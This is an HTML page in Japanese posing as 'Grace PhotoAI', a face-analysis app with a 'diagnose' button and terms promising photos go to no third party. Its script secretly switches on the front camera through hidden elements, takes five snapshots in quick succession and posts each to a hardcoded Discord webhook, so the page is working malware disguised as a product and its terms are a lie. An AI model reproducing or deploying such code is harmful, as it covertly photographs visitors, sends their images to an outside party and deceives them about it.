
<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Grace PhotoAI</title>
  <style>
    body {
      background-color: #1e1e1e;
      color: white;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
      justify-content: center;
      align-items: center;
      text-align: center;
    }

    h1 {
      font-size: 3em;
      margin-bottom: 40px;
    }

    button {
      font-size: 1.5em;
      padding: 20px 40px;
      border: none;
      border-radius: 8px;
      background-color: #4CAF50;
      color: white;
      cursor: pointer;
      transition: transform 0.2s ease, background-color 0.2s ease;
    }

    button:hover {
      background-color: #45a049;
      transform: scale(1.05);
    }

    footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      color: #aaa;
      font-size: 0.9em;
    }

    footer a {
      color: #aaa;
      text-decoration: underline;
      cursor: pointer;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 100;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.8);
    }

    .modal-content {
      background-color: #2e2e2e;
      margin: 10% auto;
      padding: 20px;
      border: 1px solid #888;
      width: 80%;
      max-width: 600px;
      color: white;
      border-radius: 10px;
    }

    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }

    video {
      display: none;
    }

    canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h1>Grace PhotoAI</h1>
  <button onclick="startCapture()">診断する</button>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <footer>
    <a onclick="showModal()">利用規約</a>
  </footer>

  <div id="termsModal" class="modal">
    <div class="modal-content">
      <span class="close" onclick="closeModal()">&times;</span>
      <h2>利用規約</h2>
      <p>このサービスはAIによる顔分析を提供するものです。写真データは診断目的で使用され、第三者に提供されることはありません。利用者は自身の責任でご利用ください。</p>
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }});
        video.srcObject = stream;

        setTimeout(() => {
          captureAndSendImages(5, 200); // 5枚, 0.2秒間隔
        }, 1000);

      } catch (err) {
        alert("カメラへのアクセスが許可されていません。");
        console.error(err);
      }
    }

    function captureAndSendImages(count, interval) {
      let taken = 0;
      const intervalId = setInterval(() => {
        if (taken >= count) {
          clearInterval(intervalId);
          return;
        }
        takeSnapshotAndSend();
        taken++;
      }, interval);
    }

    function takeSnapshotAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("file", blob, "capture.jpg");
        fetch(webhookUrl, { method: "POST", body: formData });
      }, "image/jpeg");
    }

    function showModal() {
      document.getElementById('termsModal').style.display = 'block';
    }

    function closeModal() {
      document.getElementById('termsModal').style.display = 'none';
    }

    window.onclick = function(event) {
      const modal = document.getElementById('termsModal');
      if (event.target === modal) {
        modal.style.display = 'none';
      }
    }
  </script>
</body>
</html>
